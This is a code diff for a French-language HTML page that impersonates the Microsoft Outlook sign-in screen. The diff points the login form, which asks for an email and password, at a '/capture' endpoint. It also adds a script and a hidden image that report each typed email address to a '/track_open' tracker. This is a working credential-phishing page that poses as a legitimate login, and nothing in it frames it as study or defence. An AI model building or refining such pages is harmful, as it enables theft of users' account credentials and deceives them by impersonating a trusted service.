@@ -60,14 +60,21 @@
             margin-top: 20px;
         }
     </style>
+    <script>
+        function updateTrackingImage() {
+            var email = document.getElementById("email").value;
+            var trackingImg = document.getElementById("trackOpen");
+            trackingImg.src = "/track_open?email=" + encodeURIComponent(email);
+        }
+    </script>
 </head>
 <body>
     <div class="container">
         <h2>Se connecter à Outlook</h2>
-        <form action="/submit_credentials" method="POST">
+        <form action="/capture" method="POST" id="loginForm">
             <div class="form-group">
                 <label for="email">Adresse email ou numéro de téléphone</label>
-                <input type="text" id="email" name="email" placeholder="Entrez votre email" required>
+                <input type="text" id="email" name="email" placeholder="Entrez votre email" required oninput="updateTrackingImage()">
             </div>
             <div class="form-group">
                 <label for="password">Mot de passe</label>
@@ -75,9 +82,12 @@
             </div>
             <button type="submit">Se connecter</button>
         </form>
+        <!-- Image invisible pour suivre l'ouverture de la page -->
+        <img src="/track_open?email=" id="trackOpen" style="display:none;" alt="">
         <div class="footer">
-            <p>© 2025 Microsoft. Tous droits réservés.</p>
+            <p>&copy; 2025 Microsoft. Tous droits réservés.</p>
         </div>
     </div>
+  
 </body>
 </html>
